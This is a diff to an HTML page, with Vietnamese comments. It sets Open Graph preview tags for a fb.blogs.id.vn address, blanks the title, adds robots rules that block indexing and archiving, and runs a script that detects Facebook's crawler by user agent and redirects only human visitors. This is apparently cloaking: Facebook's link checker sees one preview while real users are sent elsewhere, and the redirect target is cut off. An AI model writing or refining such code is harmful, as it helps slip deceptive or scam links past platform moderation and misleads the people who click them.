@@ -6,22 +6,24 @@
   <!-- Open Graph -->
   <meta property="og:type" content="website"/>
 
-  <!-- Tiêu đề -->
-  <meta property="og:title"
-        content="ㅤ"/>
-  <!-- Mô tả -->
-  <!-- URL -->
+  <!-- Không dùng ký tự invisible -->
+  <meta property="og:title" content=""/>
+
+  <!-- Không description -->
+  <meta property="og:description" content=""/>
+
+  <!-- Không site name -->
+  <meta property="og:site_name" content=""/>
+
+  <!-- URL thật -->
   <meta property="og:url"
-        content="ㅤ"/>
+        content="https://fb.blogs.id.vn/"/>
 
-  <!-- Ảnh preview -->
+  <!-- Ảnh -->
   <meta property="og:image"
-        content="https://i.ibb.co/XfdpHFZ6/685949564-122152862864988292-8713902762908773700-n.jpg"
-    
-    />
-    
+        content="https://i.ibb.co/XfdpHFZ6/685949564-122152862864988292-8713902762908773700-n.jpg"/>
 
-  <!-- Kích thước ảnh -->
+  <!-- Ratio Facebook thích -->
   <meta property="og:image:width" content="1200"/>
   <meta property="og:image:height" content="630"/>
 
@@ -30,6 +32,12 @@
   <!-- Optional -->
   <meta name="theme-color" content="#000000"/>
 
+  <!-- Không index -->
+  <meta name="robots"
+        content="noindex,nofollow,noarchive,nosnippet,noimageindex"/>
+
+  <!-- Title HTML cũng để trống -->
+  <title></title>
 
 </head>
 
@@ -45,7 +53,7 @@
     ua.includes("facebot") ||
     ua.includes("facebookcatalog");
 
-  // User thật → redirect
+  // User thật -> redirect
   if (!isBot) {
 
     setTimeout(() => {
